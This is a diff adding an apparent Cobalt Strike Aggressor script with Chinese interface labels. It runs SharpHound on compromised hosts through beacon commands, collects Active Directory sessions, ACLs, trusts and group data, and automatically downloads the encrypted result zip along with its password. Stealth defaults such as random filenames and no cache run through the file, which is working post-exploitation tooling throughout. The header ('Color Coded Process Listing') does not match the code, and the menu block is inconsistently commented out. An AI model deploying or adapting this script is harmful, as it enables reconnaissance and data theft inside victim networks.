@@ -1,0 +1,89 @@
+# Color Coded Process Listing
+# Author: @sari3l
+# 
+
+$sharphoundexe = 'modules/SharpHound/SharpHound.exe';
+$sharphoundps1 = 'modules/SharpHound/SharpHound.ps1';
+$pathpatt = 'Compressing data to (\w.*zip)?';
+$passpatt = 'Password for zip file is (\w+)?';
+
+sub invoke {
+    %options = $3;
+    $cmdargs = "";
+    if ($2 eq "Help") {
+        url_open("https://blog.cptjesus.com/posts/bloodhound20".$1.$2.$3.$4);
+        break;
+    }
+
+    foreach $key => $value (%options) {
+        if ($key eq "CollectionMethod") {
+            $cmdargs = 'Invoke-Bloodhound -' . $key . ' ' . $value . $cmdargs;
+        } else if ($value eq "On") {
+            $cmdargs .= ' -' . $key;
+        } else if ($key eq "custom-params") {
+            $cmdargs .= ' ' . %options['custom-params'];
+        }
+    }
+
+    if (%options['execmethod'] eq "Execute-Assembly") {
+        bexecute_assembly($bid, script_resource($sharphoundexe), $cmdargs);
+    } else {
+        bpowershell_import($bid, script_resource($sharphoundps1));
+        if (%options['execmethod'] eq "PowerShell") {
+            bpowershell($bid, $cmdargs);
+        } else {
+            bpowerpick($bid, $cmdargs);
+        }
+    }
+}
+
+sub bloodhound {
+    local('$dialog %defaults');
+    $bid = $1;
+    %defaults['execmethod'] = "Powershell";
+    %defaults['CollectionMethod'] = "Default";
+    %defaults['EncryptZip'] = "On";
+    %defaults['RandomFilenames'] = "On";
+    %defaults['PrettyJson'] = "Off";
+    %defaults['NoSaveCache'] = "On";
+    %defaults['SelfDownDel'] = "On";
+
+    $dialog = dialog("SharpHound Invoke-BloodHound", %defaults, &invoke);
+    dialog_description($dialog, "自动化加载、执行 sharphound 并进行下载");
+    drow_combobox($dialog, "execmethod", "执行方式", @("PowerShell", "PowerPick", "Execute-Assembly"));
+    drow_combobox($dialog, "CollectionMethod", "收集方式", @("Default", "Group", "LocalGroup", "RDP", "DCOM", "GPOLocalGroup", "Session", "ObjectProps", "ComputerOnly", "LoggedOn", "Trusts", "ACL", "Container", "DcOnly", "All"));
+    drow_combobox($dialog, "EncryptZip", "随机密码", @("On", "Off"));
+    drow_combobox($dialog, "RandomFilenames", "随机文件名", @("On", "Off"));
+    drow_combobox($dialog, "PrettyJson", "格式美化", @("On", "Off"));
+    drow_combobox($dialog, "NoSaveCache", "无缓存模式", @("On", "Off"));
+    drow_combobox($dialog, "SelfDownDel", "自动下载&删除", @("On", "Off"));
+    drow_text($dialog, "custom-params", "自定义参数");
+    dbutton_action($dialog, "Launch");
+    dbutton_action($dialog, "Help");
+
+    dialog_show($dialog);
+}
+
+# popup beacon_top {
+    # menu "SharpHound" {
+        item "Invoke-BloodHound" {
+            local('$bid');
+            foreach $bid ($1) {
+                bloodhound($bid);
+            }
+        }
+    # }
+# }
+
+set BEACON_OUTPUT {
+    if ($bid == $1 && %options['SelfDownDel'] eq "On" && find($2, 'Initializing BloodHound') > 0) {
+        $f_path = matches($2, $pathpatt)[0];
+        $f_pass = matches($2, $passpatt)[0];
+        bdownload($bid, $f_path);
+        $out = "\n[*] ---------------- \n\c8[*] File: $f_path\n\c8[*] Pass: $f_pass\n[*] ---------------- \n";
+        $out .= "\c9[*] 正在下载文件\n\c4[!] 请手动删除文件: $f_path\n";
+        return $out;
+    }
+
+    return $2;
+}
